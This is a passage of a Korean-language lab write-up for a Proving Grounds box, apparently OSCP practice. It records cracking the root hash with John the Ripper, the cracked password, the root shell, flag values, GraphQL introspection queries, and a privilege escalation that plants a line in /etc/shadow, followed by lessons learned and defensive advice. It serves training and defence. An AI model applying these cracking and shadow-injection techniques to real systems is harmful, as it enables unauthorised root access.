**기본 세션 파일(`~/.john/john.rec`)이 잠겨 있음.** 이름 없는 세션은 `$HOME/.john/john.rec` 하나를 공유하므로, 다른 job 이 그 파일을 쥐고 있으면(또는 비정상 종료로 락이 남아 있으면) 새 job 은 시작도 못 하고 죽음. **어떤 job 이 락을 쥐고 있었는지는 관측 없음**([가정] — 6-3). **세션 이름을 명시**해 재실행함.

```
0:00:00:00 Command line: john --session=graphroot --pot=root.pot --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt root_hash.txt 
```
출처: `~/PG/Graph/graphroot.log` (john 이 세션 로그에 직접 기록한 명령행)

```
espartaco        (root)     
1g 0:00:00:36 DONE (2026-08-21 15:07) 0.02739g/s 1949p/s 1949c/s 1949C/s fullysick..citadel
```
출처: `~/PG/Graph/john_root2.out`

36초 만에 rockyou 로 끝남 — sha512crypt 라도 사전에 있는 값이면 iteration count(cost 1 = 5000)가 큰 방어가 못 됨.

크랙한 `espartaco` 를 josh 셸의 `su - root` 에 넣어 root 를 잡음(위 프로세스 트리).

```
root@graph:~# whoami; id; hostname; hostname -I; date; ls -la /root/proof.txt; c
at /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root)
graph
192.168.248.201
Fri Aug 21 02:08:23 EDT 2026
-rw------- 1 root root 33 Aug 21 01:49 /root/proof.txt
3e823452d93d1c9c8ef9bcf9d34612eb
root@graph:~#
```
출처: `~/PG/Graph/proof_root.txt` 후반부. 명령행이 `c` / `at` 로 끊긴 것은 pty 폭에서 줄바꿈된 그대로임. 파일 앞부분에는 같은 명령의 첫 실행(02:08:13) 출력이 한 번 더 있음.

sshd 설정에는 root 직접 로그인도 열려 있음.

```
PermitRootLogin yes
```
출처: `~/PG/Graph/harvest_root.txt` 「SSH」절

⚠️ 다만 **이 박스에서 root 셸을 실제로 잡은 경로는 SSH 직접 로그인이 아니라 josh 세션의 `su - root`** 임(`ps auxf` 에 `sshd: root` 세션이 없음). 이 설정은 «쓸 수 있었을» 우회로였을 뿐 실제로 쓰이지 않음. 대부분의 실전/시험 박스는 `PermitRootLogin no` 이므로 이 경로가 항상 열려 있다고 기대하면 안 됨.

## 5. 플래그

⚠️ 아래 값은 **2026-08-21 인스턴스** 것임. PG 는 박스를 다시 켤 때마다 새로 만듦.

user — `/home/jane/local.txt` = `754551935abdc3b2bdde424a9b5ccb66`
root — `/root/proof.txt` = `3e823452d93d1c9c8ef9bcf9d34612eb`

둘 다 표준 위치, 미끼 없음. **둘 다 대화형 pty 셸에서 원위치 `cat` 한 결과**임 — user 는 jane 의 SSH 세션(`jane@graph:~$`), root 는 josh 세션에서 `su - root` 한 셸(`root@graph:~#`)이고, 프롬프트가 그대로 `proof_user.txt`·`proof_root.txt` 에 캡처돼 있음(3장·4장). 웹셸 경유가 아니므로 시험 기준 0점 처리 대상이 아님.

## 6. 막혔던 지점 / 시행착오

전체 작업은 14:51(정찰 시작)~15:11(정리)로 **약 20분**. 그 안에서도 겹치는 시도와 공백이 있음.

### 6-1. gobuster 를 두 번 돌림 — 배경 스캔을 기다리지 못함

`.bg-gobuster.sh` 가 recon 단계에서 이미 raft-small-words + 확장자 6종으로 백그라운드 스캔을 던져 놓은 상태였음(14:52 시작, 완료는 15:04). 그런데 14:54 에 `gobuster-raft.txt` 라는 **별도의 수동 실행**이 끼어 있음 — ANSI 컬러가 살아 있고 `DONE` 마커가 붙은 걸 보면 배경 스크립트가 아니라 손으로 친 것임. 결과는 `/static`·`/Static`·`/STATIC` 세 개로 **완전히 동일**했음. 배경 스캔이 확장자까지 붙여 더 넓게 훑고 있었으므로, 그 결과가 나올 때까지 10분을 못 기다려서가 아니라 — 애초에 **그 사이 GraphQL 벡터가 이미 잡혀서** 급히 확인 차 돌린 것으로 보임(gql/ 산출물이 같은 14:52~14:53 구간에 몰려 있음). 결과적으로 중복이었지만, "배경 스캔이 다 도는 동안 다른 벡터를 계속 민다"는 원칙 자체는 지켜진 셈임.

### 6-2. SNMP·UDP 스캔은 완전한 헛손 — 그러나 짧게 끝남

`onesixtyone` 5개 커뮤니티 문자열이 전부 무응답, UDP top-100 도 열린 포트가 없었음. 이 박스에서 SNMP/UDP 는 처음부터 빈손이었지만, 확인 자체는 각각 수 초 안에 끝나 손실이 크지 않았음 — **"확인은 짧게, 미련은 갖지 않는다"**의 실례.

### 6-3. john 세션 파일 충돌로 두 번째 크랙이 즉사함

`john --format=sha512crypt root_hash.txt` (세션 이름 미지정)가 **`Crash recovery file is locked: /home/kali/.john/john.rec`** 로 즉시 죽음(`john_root.out`). 이름 없는 세션은 `$HOME/.john/john.rec` 하나를 공유하는데, 다른 PG 박스 작업에서 쓰던 세션 파일이 아직 잠겨 있었던 것으로 보임(**[가정]** — 정확히 어떤 이전 job 이 이 락을 쥐고 있었는지는 관측 없음). `--session=graphroot` 로 이름을 지정해 재실행하자 곧바로 정상 동작함. 손실 자체는 작음 — `root_hash.txt` 15:05:47 → 실패 로그 15:06:02 → 재실행 완료 15:07:33 로 **1분 30초 안에 회복**함. 교훈은 시간이 아니라 습관 쪽임: **여러 박스를 병행하면 john 세션명을 항상 명시할 것.**

### 6-4. 익스플로잇을 «실행 로그 없이» 돌림 — 그런데 타겟이 대신 기록해 줌

`josh_hash.txt`(14:59) → `exploit_passgen.sh`(15:00) → `root_hash.txt`(15:05) 구간에서 Kali 쪽에 남은 것은 스크립트 소스 하나뿐임. `sudo -S -l` 출력도, `ls -la`/`file /usr/local/bin/pass-gen` 도, josh 로 갈아탄 세션의 캡처도 **전부 관측 없음**임.

이번엔 운이 좋았음. root 를 잡은 뒤 돌린 `harvest.sh` 가 `/etc/shadow` 전문과 `ps auxf` 를 떠 놓아서, **조작 결과와 세션 트리가 타겟 쪽 스냅샷에 남았고** 그것으로 4장의 인과를 사후 복원할 수 있었음. 저장한 스크립트 사본이 손상돼 있었다는 사실조차 그 스냅샷의 `bogus` 행과 대조해서야 확정됨.

일반화하면 **「실행 직후 스냅샷」이 「실행 로그」를 어느 정도 대신함.** 익스플로잇을 던졌으면 그 자리에서 바뀐 대상(`/etc/shadow`·`ps auxf`·해당 파일의 `ls -la`)을 한 번 떠 두는 것이, 출력 리다이렉트를 빠뜨렸을 때의 보험이 됨. 그래도 남는 공백은 있음 — 심은 해시의 **평문**과 root 해시를 «읽은 명령»은 어느 쪽 기록에도 없음.

### 6-5. GraphQL 주입 payload 자체를 기록하지 않음

`dump_users.json` 은 **응답**만 남겼고, 그걸 만든 **요청 본문**(정확한 `searchTerm` 페이로드)은 어디에도 저장하지 않음. 결과가 나온 순간 다음 단계(hashes.txt 정리 → john)로 바로 넘어간 것으로 보임. 성공한 요청일수록 재현 문구를 그대로 파일에 남겨야 하는데, **"통했다"에 취해 그 요청 자체를 놓침** — 6-4 의 실행 로그 누락과 같은 종류의 실수임. 다만 이쪽은 대신 기록해 줄 스냅샷이 없어 **끝내 복원되지 않음.**

## 7. OSCP 시험 관점

1. **GraphQL introspection 두 줄을 손에 익혀라.** `{__schema{queryType{name}mutationType{name}types{name kind}}}` 로 존재 확인, `{__type(name:"Query"){fields{name args{name type{name}}}}}` 로 필드·인자 이름까지 확보함. UI(GraphiQL/Playground)가 꺼져 있어도 introspection 쿼리 자체는 별도 설정이 없으면 열려 있는 경우가 많음.
2. **응답에 "이름"과 "이름:비밀 조합"이 나란히 섞여 나오면 그 자체가 주입 성공의 증거임.** 정상 스키마라면 나올 수 없는 모양이기 때문임.
3. **수동 대안** — 이 박스는 자동 스캐너 없이 `curl` POST 로만 진행됨. GraphQL 은 sqlmap 류가 다루지 못하는 영역이라 애초에 수동이 기본임.
4. **성공한 요청/페이로드는 그 자리에서 파일로 남겨라.** 6-5 가 이 원칙을 어긴 대가임 — 재현 문서에 정확한 주입 문자열을 못 실음.
5. **`sudo -l` 은 비밀번호를 넣어서도 다시 확인하고, 그 출력을 파일로 남겨라.** 이번엔 안 남겨서, sudo 항목의 «허용 조건»(NOPASSWD 여부·인자 제한)을 보고서에 못 씀. 권한상승 서술에서 심사관이 제일 먼저 보는 줄이 그것임.
6. **익스플로잇을 던진 «직후» 바뀐 대상을 한 번 떠라.** `/etc/shadow`·`ps auxf`·대상 파일 `ls -la` 한 묶음이면 출력 리다이렉트를 빠뜨려도 인과가 복원됨(6-4).
7. **john 세션 충돌은 `--session=<이름>` 으로 피함.** 병렬로 여러 박스를 다루는 상황이 아니라도, 크래시 복구 파일이 이전 실행에서 남아 있으면 세션 미지정 실행은 즉시 죽음.
8. **시간 배분** — 이 박스는 SNMP/UDP 확인에 낭비가 거의 없었고(6-2), gobuster 중복(6-1)도 10분 안쪽이라 손절 판단이 필요한 수준은 아니었음. 진짜 아쉬운 지점은 **기록 누락**(6-4·6-5)이지 시간 낭비가 아님 — 시험장에서는 "빨리 푸는 것"과 "재현 가능하게 남기는 것" 사이에서 후자를 등한시하면 보고서 점수가 깎임.

## 8. 방어 관점

- GraphQL 필드의 인자를 ORM/쿼리 빌더에 그대로 이어붙이지 말고 파라미터 바인딩을 씀. `users(searchTerm)` 하나가 사용자 테이블 전체와 해시 컬럼까지 새어 나가게 만듦.
- introspection 은 운영 환경에서 기본적으로 꺼야 함(예: `express-graphql` 의 `graphiql: false` 만으로는 부족하고, 스키마 자체에서 introspection 을 막는 미들웨어 필요).
- sudo 로 허용하는 커스텀 바이너리는 **사용자 입력에 개행이 섞여도 안전하게 처리**해야 함. 위치 기반 필드 조립 대신 구조화된 API(예: `pwconv`/`chpasswd` 처럼 검증된 도구)를 쓰는 쪽이 안전함.
- shadow 파일을 쓰는 도구는 **행 단위 무결성**을 검증해야 함. 같은 이름의 행이 둘 이상이면 거부하거나 경고하는 것만으로도 이 공격은 성립하지 않음 — 이 박스는 원래부터 josh 행을 셋 갖고 있었고, 넷째를 앞에 끼워 넣는 것을 아무도 막지 않음.
- `PermitRootLogin no` 로 바꿈. 이 박스에서는 실제로 쓰이지 않았지만(root 는 `su` 로 잡힘), 크랙된 비밀번호 하나로 즉시 원격 root 가 되는 경로를 굳이 열어 둘 이유가 없음.
- 비밀번호 정책 — `oakland`·`espartaco` 둘 다 rockyou 사전 한 방에 뚫림. 최소 길이·사전 대조를 강제해야 함.

## 9. 참고 자료

- GraphQL introspection 질의 형태는 GraphQL 공식 스펙의 `__schema`/`__type` 메타 필드를 그대로 사용함.
- 이 박스에서 사용한 취약점에 해당하는 공개 CVE 번호는 확인하지 않음 — 커스텀 Node.js 앱으로 보이며 관측 없음.

## 남긴 흔적

**타겟 쪽** — 심은 것은 셋임. ① `/etc/shadow` 의 `josh:$6$Gr4phSlt$…` 행(성공한 주입) ② 같은 파일의 `bogus:…njosh:…` 행(개행이 안 먹은 실패 잔재) ③ jane 행의 `max` 필드와 해시 변조. 셋 다 백업 `/tmp/s.restore` 로 복원했고(1688 → 1433바이트), 복원 기록이 `cleanup_evidence_box.txt` 에 남아 있음.

`/tmp` 는 정리 후 목록 기준으로 `netplan_tg_fx7l0`(박스 자체의 것) 등 시스템 디렉터리만 남았고, `.h.sh`·`.h/`·`s.restore` 는 지워짐. 다만 **정리 기록 파일 `/tmp/cleanup_evidence.txt`(926바이트, root 소유) 자체는 그대로 남아 있음** — 목록 안에 찍혀 있음.

**Kali 쪽** — tmux 세션 `graph-josh`·`graphjosh` 가 이 노트 작성 시점까지 남아 있음(둘 다 내용 없이 프롬프트만 있는 상태로 확인). **관리자가 처리할 몫이라 직접 종료하지 않음.**

## 관련 노트

- [[Fikklish]] — `sudo -l` 을 비밀번호 확보 후 다시 확인해야 한다는 같은 교훈, 그리고 `.psql_history` 처럼 "다른 통로로 새어나온 자격증명" 계열
- [[_STATUS]]
